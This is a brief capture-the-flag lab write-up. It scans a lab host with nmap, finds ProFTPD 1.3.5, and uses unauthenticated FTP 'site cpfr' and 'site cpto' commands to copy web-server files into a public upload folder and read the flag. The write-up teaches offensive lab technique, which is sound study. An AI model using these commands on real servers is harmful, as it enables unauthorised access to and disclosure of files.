after 
```
nmap -A 10.0.101.2
```
![0](https://user-images.githubusercontent.com/69141453/110228411-c8eba980-7eb5-11eb-80cc-821cc47535ea.PNG)

we discovered that it has an FTP running on port 21 with version ProFTPD 1.3.5
after googling it i found how to connect to it
 
 ```
 ftp 10.0.101.2
 ```
 then connect to ftp
 ```
 ftp 10.0.101.2
 site cpfr /var/www/
 site cpto /var/www/html/upload/flag
 ```
 ![4](https://user-images.githubusercontent.com/69141453/110228456-3ac3f300-7eb6-11eb-97a1-15386370c083.PNG)
 
 to copy the flag from the webserver files to the path that i can access which is the **/upload/** path
 
![5](https://user-images.githubusercontent.com/69141453/110228534-b9b92b80-7eb6-11eb-994d-d0c3aee774bf.PNG)

and after opening it, it had the flag

![6](https://user-images.githubusercontent.com/69141453/110228550-d9e8ea80-7eb6-11eb-9fd1-8b3c4d1e527c.PNG)
